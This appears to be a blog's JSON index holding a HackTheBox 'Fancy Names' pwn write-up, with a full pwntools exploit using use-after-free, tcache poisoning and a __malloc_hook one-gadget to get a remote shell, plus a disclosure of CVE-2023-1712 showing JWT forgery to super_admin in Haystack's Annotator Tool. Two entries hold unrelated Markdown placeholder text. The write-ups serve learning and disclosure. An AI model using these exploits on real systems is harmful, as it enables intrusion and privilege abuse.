[{"content":"","date":"1 August 2023","permalink":"/tags/binary/","section":"Tags","summary":"","title":"binary"},{"content":"","date":"1 August 2023","permalink":"/ctf/","section":"Ctfs","summary":"","title":"Ctfs"},{"content":"","date":"1 August 2023","permalink":"/tags/glib-2.27/","section":"Tags","summary":"","title":"glib 2.27"},{"content":"","date":"1 August 2023","permalink":"/tags/heap/","section":"Tags","summary":"","title":"heap"},{"content":" Introduction # Fancy Names is a pwn challenge from HackTheBox created by user w3th4nds.\nThis challenge involes taking advantage of a Use-After-Free vulnerability to poison the tcache, which will lead to executing a One Gadget through Malloc Hook. The challenge also provides the libc that the program uses which is version 2.27. This version is a bit outdated lacking newer security futures like Safe-Linking.\nThis writeup is not ment as an exhaustive resource and only focuses on giving a walkthrough on the challenge as it will not get into much detail about how the tcache works or basic binary exploitation concepts.\nStatic Analysis # Starting with some static analysis. First I will run the file command to get some general information about the binary, like the fact that it is an ELF 64-bit1 and also not stripped which will be helpful. Then I will run the checksec command to get a sense for the general protections of the binary. As it seems it has all the protections enabled!\n‚îå‚îÄ[root@8042bd2c8129]‚îÄ[/work/pwn/Fancy names/challenge] ‚îî‚îÄ‚îÄ‚ïº #file ./fancy_names clear ./fancy_names: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./.glibc/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=26a359d5c589d9430ec90844cc3bb34b12ab02b4, not stripped clear: cannot open `clear\u0026#39; (No such file or directory) ‚îå‚îÄ[root@8042bd2c8129]‚îÄ[/work/pwn/Fancy names/challenge] ‚îî‚îÄ‚îÄ‚ïº #checksec ./fancy_names [*] \u0026#39;/work/pwn/Fancy names/challenge/fancy_names\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b\u0026#39;./.glibc/\u0026#39; ‚îå‚îÄ[root@8042bd2c8129]‚îÄ[/work/pwn/Fancy names/challenge] ‚îî‚îÄ‚îÄ‚ïº # To get to the thick of things I will fire binary ninja. I use a desktop version of the tool, but there is also a free web app which works fine for most cases. After a few minutes of looking around it seems like there are two functions of interest, main and menu.\nLooking of the BUG üêû # The main function starts after calling create_random_username and menu functions. It asks the user to select an option between Upgrade Skills which prompts the user to select a number to indicate a points value and then a string to indicate to which skill to attribute those points, Get Starter Pack which just prints some text to the terminal and Exit. From the three only Upgrade Skills seems of immediate interest because of its more dynamic nature and to be more precise because of the malloc call. Dispite that though there is no bug to exploit here!\nmain function decompilation from binary ninja [+] Welcome MarvelousNoob9044! [*] Choose actions (1/4): 1. Upgrade skills üõ°Ô∏è 2. Get starter pack üí∞ 3. Exit üèÉ \u0026gt; // part of main function code while (true) { if (var_138 \u0026lt;= 3) { fflush(stdout); var_138 = (var_138 + 1); fprintf(stdout, \u0026#34;\\n[*] Choose actions (%ld/4): \\n‚Ä¶\u0026#34;, var_138); fflush(stdout); uint64_t rax_6 = read_num(); if (rax_6 == 1) { fwrite(\u0026#34;\\n[*] Stat points (max 120 per t‚Ä¶\u0026#34;, 1, 0x25, stdout); fflush(stdout); uint64_t rax_8 = read_num(); int64_t rax_10 = malloc(rax_8); if (rax_10 == 0) { break; } fwrite(\u0026#34;\\n[*] Stat (e.g. Health, Strengt‚Ä¶\u0026#34;, 1, 0x36, stdout); fflush(stdout); read(0, rax_10, (rax_8 + 8)); fprintf(stdout, \u0026#34;%s\\n[+] Stat points added!\\n%s\\n\u0026#34;, \u0026#34;\\x1b[1;32m\u0026#34;, \u0026#34;\\x1b[1;34m\u0026#34;); fflush(stdout); continue; } else if (rax_6 == 2) { fprintf(stdout, \u0026#34;\\n%s[+] Starter pack contains: \\n‚Ä¶\u0026#34;, \u0026#34;\\x1b[1;32m\u0026#34;, \u0026#34;\\x1b[1;34m\u0026#34;); continue; } } exit(0x45); /* no return */ } Moving to the menu function things get much more interesting. The menu function not unlike main presents four options to the user. Custom name to select a user provided name for the program to use, Reroll name which will pick three random usernames from a list, Continue that will exit the menu function to continue execution on main and finaly exit that terminates the program.\n[*] Welcome friend, your default username is: MarvelousNoob9044 [!] You can only change name twice! One custom and one suggested. Choose wisely! ********************* * * * [1] Custom name * * [2] Reroll name * * [3] Continue * * [4] Exit * * * ********************* \u0026gt; The first bug I notice occurs when selecting the Custom name option. The code will store the user input in the tmp_username variable which has no buffer size preset which means that the compiler will produce an executable that does not allocate enough space for it in the stack. This coupled with the fact that it is used in the fprintf function as well as how C-strings work can result in sensitive information like pointers leaking. This will be essential for an exploit to work because both ASLR and PIE are enabled and this means that addresses in the binary will be randomised on every run.\nfflush(stdout); fwrite(\u0026#34;\\n[*] Insert new name (minimum 5‚Ä¶\u0026#34;, 1, 0x28, stdout); fflush(stdout); void tmp_username; int32_t rax_7 = read(0, \u0026amp;tmp_username, 0x63); fflush(stdout); fprintf(stdout, \u0026#34;\\n[*] Are you sure you want to u‚Ä¶\u0026#34;, \u0026amp;tmp_username); fflush(stdout); Another thing I notice is that at the beginning of menu there are two malloc(0x64) calls that will make space in the heap. Both allocations will be initially used to store the current username. As it seems though only the second allocation will ever actually be used for something. The only time the first allocation is touched again is by the free function and this will come really handy later because for for the exploit I will be doing two free chunks are nessesary.\nchar* never_used_allocation = malloc(0x64); strcpy(never_used_allocation, current_username); char* new_username = malloc(0x64); strcpy(new_username, current_username); The second bug, and the one that spells PWNED for this program comes from the fact that during the Reroll name function the program frees the new_username pointer but dispite that it nevers clears the reference or renews it with a new malloc call. This practically means that the program will write to a location that now holds very sensitive metadata used by tcache when saving the custom username that the user inputs, giving me control of tcache. This exploit technique is called tcache poisoning, here is a good POC. As an attacker I will use this to get write access to any address in the binary I want. The location of choice will be __malloc_hook which is part of libc.\n// free new_username during Reroll name option uint64_t user_input = read_num(); if (var_290 == 1) { fprintf(stdout, \u0026#34;%s\\n[-] Cannot change username a‚Ä¶\u0026#34;, \u0026#34;\\x1b[1;31m\u0026#34;, \u0026#34;\\x1b[1;34m\u0026#34;); } else { free(new_username); // Initial free happens here fprintf(stdout, \u0026#34;\\n%s[!] Name has been deleted!\\n‚Ä¶\u0026#34;, \u0026#34;\\x1b[1;32m\u0026#34;, \u0026#34;\\x1b[1;34m\u0026#34;); create_random_username(\u0026amp;var_268); sleep(1); srand(time(nullptr)); ... // later using the freed new_username if (var_26b != 0x79) { memset(\u0026amp;tmp_username, 0, 0x100); fprintf(stdout, \u0026#34;%s\\n[*] Name has not been change‚Ä¶\u0026#34;, \u0026#34;\\x1b[1;35m\u0026#34;, \u0026#34;\\x1b[1;34m\u0026#34;); } else if (rax_8 \u0026lt;= 5) { fprintf(stdout, \u0026#34;%s\\n[-] Invalid name!\\n%s\u0026#34;, \u0026#34;\\x1b[1;31m\u0026#34;, \u0026#34;\\x1b[1;34m\u0026#34;); memset(\u0026amp;tmp_username, 0, ((int64_t)rax_8)); } else { var_298 = 2; var_2a0 = (var_2a0 + 1); strcpy(new_username, \u0026amp;tmp_username); // Copy tmp_username to freed pointer new_username new_username[(strlen(new_username) - 1)] = 0; char const* const rax_20; if (strcmp(new_username, \u0026#34;wisely\u0026#34;) != 0) { rax_20 = \u0026amp;data_2a33; } else { rax_20 = \u0026#34;\\n%s[-.-] Very funny.. 10 points‚Ä¶\u0026#34;; } fprintf(stdout, rax_20, \u0026#34;\\x1b[1;31m\u0026#34;, \u0026#34;\\x1b[1;34m\u0026#34;); fprintf(stdout, \u0026#34;\\n[!] New name: %s%s%s\\n\u0026#34;, \u0026#34;\\x1b[1;32m\u0026#34;, new_username, \u0026#34;\\x1b[1;34m\u0026#34;); memset(\u0026amp;tmp_username, 0, 0x100); } ... Dynamic Analysis # As it was mentioned before in order for the exploit to work I need to utilize the leak vulnerability. Using gdb and setting a break point just before saving the user input to the stack I can inspect its contents to see what information can be leaked.\nAs can be seen in the bottom of the image below the stack has room for only 15 bytes before it starts leaking information. The first 8 bytes hold the current value for username and then there are 8 more bytes of free space. After that though it has a PIE address and a stack address. Both could be useful in some other senario but in this one a libc address is needed.\nLuckily enough there is a libc address within reach 56 bytes (I can write up to 100 bytes) from the start of the writing buffer. If I send for example 56 As as input fprintf will create a string that also includes the libc address, because no \\x00 bytes will be present before it to stop it, and fflush will output this sting making available for use.\nstack just before storing the custom name That is everything needed to create a working exploit that results in remote command execution!\nWritting an Expoit # Based on the results the binary analysis an exploit can be created. This exploit will involve the following steps:\nMake two allocations of 100 bytes (0x64) using malloc just by going to the menu function (happens naturally by the program flow). Leak libc address by sending 56 bytes through the custom name option. It also makes the first free call. Using libc leak calculate the location libc is loaded in the binary. It minus 0x64e1c bytes from the leaked address. Use libc base location to calculate address of __malloc_hook. This will be the location I want to write to. It holds the pointer to a function that runs everytime malloc is called. Use libc base location to calculate address of magic gadget2, which will be stored in __malloc_hook. To find one gadgets in the program\u0026rsquo;s libc this tool can be used. Create the dangling pointer (second free) by selecting the reroll name option. Store the __malloc_hook pointer to the dangling pointer. Malloc twice 100 (0x64) bytes through the stats points function (which is a part of main as seen in the code snippet at the beginning) to gain write access to the __malloc_hook address. More specifically the second allocation will take the poluted tcahce entry which points to __malloc_hook, giving me arbitary write to it. Write the magic gadget2 to __malloc_hook location. Use the stats points function from main again but this time when malloc is naturally called it will proc __malloc_hook that invokes the magic gadget2 and an interactive shell will pop giving command execution. remote command execution on server Below is the code for the exploit:\n#!/usr/bin/python3 from pwn import * def create_dangling_free_pointer(p): p.recvuntil(b\u0026#34;*********************\u0026#34;) p.recvuntil(b\u0026#34;*********************\u0026#34;) p.sendline(b\u0026#34;2\u0026#34;) p.recvuntil(b\u0026#34;3. \u0026#34;) p.recvline() # Send a non valid option so that nothing will be written to # the address location. This will allow for putting in # a address later for the arbitary write p.sendline(b\u0026#34;4\u0026#34;) def leak_address(p, padding_size): # Send line to select custom name p.sendline(b\u0026#34;1\u0026#34;) # Send custom name p.recvuntil(b\u0026#34;[*] Insert new name (minimum 5 chars):\u0026#34;) p.sendline(b\u0026#34;A\u0026#34; * (padding_size - 1)) p.recvuntil(b\u0026#34;name \u0026#34;) p.recv(padding_size) leaked_addr = u64(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) print(\u0026#34;Leaked stack addr:\u0026#34;, hex(leaked_addr)) p.sendline(b\u0026#34;n\u0026#34;) return leaked_addr def save_write_addr(p, write_addr): # Send line to select custom name p.recvuntil(b\u0026#34;*********************\u0026#34;) p.recvuntil(b\u0026#34;*********************\u0026#34;) p.sendline(b\u0026#34;1\u0026#34;) # Send custom name p.recvuntil(b\u0026#34;[*] Insert new name (minimum 5 chars): \u0026#34;) p.sendline(write_addr) p.recvuntil(b\u0026#34;(y/n): \u0026#34;) p.sendline(b\u0026#34;y\u0026#34;) def write(p, payload): # Send line to select custom name p.recvuntil(b\u0026#34;*********************\u0026#34;) p.recvuntil(b\u0026#34;*********************\u0026#34;) p.sendline(b\u0026#34;3\u0026#34;) for i in range(2): p.recvuntil(b\u0026#34;Upgrade skills\u0026#34;) p.sendline(b\u0026#34;1\u0026#34;) p.recvuntil(b\u0026#34;Stat points (max 120 per time):\u0026#34;) p.sendline(b\u0026#34;100\u0026#34;) p.recvuntil(b\u0026#34;Stat (e.g. Health, Strength, Agility or Custom): \u0026#34;) if i == 0: p.sendline(b\u0026#34;Custom\u0026#34;) else: p.sendline(payload) def pwn(p): p.recvuntil(b\u0026#34;Upgrade skills\u0026#34;) p.sendline(b\u0026#34;1\u0026#34;) p.recvuntil(b\u0026#34;Stat points (max 120 per time):\u0026#34;) p.sendline(b\u0026#34;100\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: # context.log_level = \u0026#34;DEBUG\u0026#34; context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;) p = remote(\u0026#34;167.172.62.51\u0026#34;, 32652) libc = ELF(\u0026#34;./.glibc/libc.so.6\u0026#34;) # First Leak leaked_libc_addr = leak_address(p, 8 * 7) print(\u0026#34;Leaked libc addr:\u0026#34;, hex(leaked_libc_addr)) libc_base = leaked_libc_addr - 0x64eb0 - 0x94 libc.address = libc_base malloc_hook_addr = libc.symbols[\u0026#34;__malloc_hook\u0026#34;] print(\u0026#34;Libc base:\u0026#34;, hex(libc_base)) print(\u0026#34;Malloc hook address:\u0026#34;, hex(malloc_hook_addr)) input(\u0026#34;Continue...\u0026#34;) print(\u0026#34;Creating a dangling pointer\u0026#34;) # Then create dangling free pointer create_dangling_free_pointer(p) input(\u0026#34;Continue...\u0026#34;) # Then put adritary write address print(\u0026#34;Allocate to arbitary memory\u0026#34;) save_write_addr(p, p64(malloc_hook_addr)[:-2]) input(\u0026#34;Continue...\u0026#34;) print(\u0026#34;Writing payload\u0026#34;) payload = p64(libc_base + 0x4f432) # execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x40, environ) write(p, payload) # Malloc once more for the hook to fire pwn(p) p.interactive() ELF binaries are compiled for Linux, DWARF for Windows and Mach-O for MacOS.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nMagic Gadgets or One Gadgets are simply a pointer to execve(\u0026quot;/bin/sh\u0026quot;) in libc. If available they can be very powerful because they remove the need to construct a regular ROP chain.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"1 August 2023","permalink":"/ctf/htb-fancy-names/","section":"Ctfs","summary":"Introduction # Fancy Names is a pwn challenge from HackTheBox created by user w3th4nds.","title":"HTB Fancy Names"},{"content":"","date":"1 August 2023","permalink":"/tags/pwn/","section":"Tags","summary":"","title":"pwn"},{"content":"","date":"1 August 2023","permalink":"/","section":"r4f705's blog","summary":"","title":"r4f705's blog"},{"content":"","date":"1 August 2023","permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"","date":"1 August 2023","permalink":"/tags/tcache/","section":"Tags","summary":"","title":"tcache"},{"content":"","date":"21 July 2023","permalink":"/bug-bounty/","section":"Bug-bounties","summary":"","title":"Bug-bounties"},{"content":"","date":"21 July 2023","permalink":"/tags/cve/","section":"Tags","summary":"","title":"cve"},{"content":"","date":"21 July 2023","permalink":"/tags/docker/","section":"Tags","summary":"","title":"docker"},{"content":" JWT Token Forgery for Haystack\u0026rsquo;s Annotator Tool (CVE-2023-1712) # Introduction # The purpose of this disclosure is to ethically report a web vulnerability found in the Annotator Tool. By analyzing the provided docker image, it was possible to gain access to the source code and identify a critical security flaw related to the generation of JSON Web Tokens (JWTs). This vulnerability allows low-level users to escalate their privileges and perform actions that were previously restricted.\nVulnerability Details # The vulnerability stems from a hardcoded value found in the configuration file config/config.production.js. Specifically, the value of config.jwt.secret = Hm************tA is used to sign JWT tokens. Exploiting this weakness enables an attacker to create new JWT tokens with the \u0026ldquo;super_admin\u0026rdquo; role, granting unauthorized access and privileges.\nExploitation Method # To exploit this vulnerability, the attacker needs to replicate the token generation process used by the application. This can be achieved by modifying the existing back-end code of the annotation tool. The following lines can be added to the getSignedJWT function in app/service/userService.js:\nconst fs = require(\u0026#34;fs\u0026#34;); let x = this.app.jwt.sign( { id: 2, email: \u0026#34;r4F705@proxy.com\u0026#34;, role: \u0026#34;super_admin\u0026#34;, }, \u0026#34;Hm************tA\u0026#34; ); fs.writeFile(\u0026#34;/tmp/test.txt\u0026#34;, x, (err) =\u0026gt; { if (err) { console.error(err); } }); By incorporating this code snippet into a modified version of the back-end, the attacker can host a local instance of the application. Logging in with a regular user account on the modified instance will generate a new JWT token with the \u0026ldquo;super_admin\u0026rdquo; role. To utilize this forged token, the attacker can retrieve it from /tmp/test.txt within the running container or the host system. Then, by updating the value of the \u0026ldquo;dpst-token\u0026rdquo; found in the browser\u0026rsquo;s local storage for the original login domain, the attacker can assume the elevated privileges associated with the \u0026ldquo;super_admin\u0026rdquo; role.\nlogged in as admin at deepset.ai Impact # This vulnerability has significant implications for all current versions of the annotation tool, regardless of whether they are hosted online or within a company\u0026rsquo;s internal network. Since the containers utilized by the tool share the same secret key, any forged tokens created using the vulnerability will be effective across all instances of the tool.\nThe impact of this vulnerability is twofold, affecting both the integrity and availability of the tool and its associated data. Exploiting the vulnerability allows an attacker to gain super admin access without the need for a valid account, posing a severe security risk. With super admin privileges, an attacker can masquerade as any other user, leading to unauthorized modifications to the annotation process and the potential corruption of valuable training data for QA models. As a result, the reliability and trustworthiness of the annotation tool\u0026rsquo;s outputs are compromised.\nFurthermore, an attacker can leverage scripted attacks to remove created users, significantly impeding the functionality and usability of the tool. The removal of user accounts can disrupt workflows and impede collaboration, rendering the tool\u0026rsquo;s usage challenging and hindering productivity.\nOriginally reported on huntr\n","date":"21 July 2023","permalink":"/bug-bounty/haystack/","section":"Bug-bounties","summary":"JWT Token Forgery for Haystack\u0026rsquo;s Annotator Tool (CVE-2023-1712) # Introduction # The purpose of this disclosure is to ethically report a web vulnerability found in the Annotator Tool.","title":"Haystack"},{"content":"","date":"21 July 2023","permalink":"/tags/jwt/","section":"Tags","summary":"","title":"jwt"},{"content":"","date":"21 July 2023","permalink":"/tags/reversing/","section":"Tags","summary":"","title":"reversing"},{"content":"","date":"21 July 2023","permalink":"/tags/web/","section":"Tags","summary":"","title":"web"},{"content":"","date":"21 July 2023","permalink":"/tags/arm/","section":"Tags","summary":"","title":"arm"},{"content":" Lists # To define a list of items, just put a *, a -, or a + at the start of the line of each item of the list followed by at least a space, to end the list, leave a blank line\nred green blue white grey black yellow pink orange You can also define numbered list, putting a number followed by a . or a ) and a space at the start of the line (you may use any number, the first one is taken to start counting, then it will increment by one):\nyou may leave blank items or start again You can insert any block inside a list, you have to respect the indentation of the text of the list item\nA paragraph of text (spanning multiple lines),\nfenced code, indented code (4 spaces + 2 spaces for the list indentation, one blank line above, one below), quotes,\nanother list (and so on\u0026hellip;), or headers # ","date":"21 July 2023","permalink":"/binary/arm-antidote/","section":"Binaries","summary":"Lists # To define a list of items, just put a *, a -, or a + at the start of the line of each item of the list followed by at least a space, to end the list, leave a blank line","title":"ARM Antidote"},{"content":"","date":"21 July 2023","permalink":"/binary/","section":"Binaries","summary":"","title":"Binaries"},{"content":" Headers # There are two ways to define headers:\nThe biggest possible header # You can also use this markup # (I prefer the first one as it\u0026rsquo;s more readable when looking directly at the source code)\nA sub heading # This is the alternative format # Then you can go smaller # And smaller # And even smaller # No, you can\u0026rsquo;t go smaller than this # The good thing is that many tools that convert Markdown in HTML or PDF are able to generate the index of your document, or links to the headers automatically (like Github does on the source of Markdown files)\n","date":"21 July 2023","permalink":"/web/easter-bunny/","section":"Webs","summary":"Headers # There are two ways to define headers:","title":"Easter Bunny"},{"content":"","date":"21 July 2023","permalink":"/tags/poisoning/","section":"Tags","summary":"","title":"poisoning"},{"content":"","date":"21 July 2023","permalink":"/tags/varnish/","section":"Tags","summary":"","title":"varnish"},{"content":"","date":"21 July 2023","permalink":"/web/","section":"Webs","summary":"","title":"Webs"},{"content":"","date":"1 January 0001","permalink":"/authors/","section":"Authors","summary":"","title":"Authors"},{"content":"","date":"1 January 0001","permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"1 January 0001","permalink":"/series/","section":"Series","summary":"","title":"Series"}]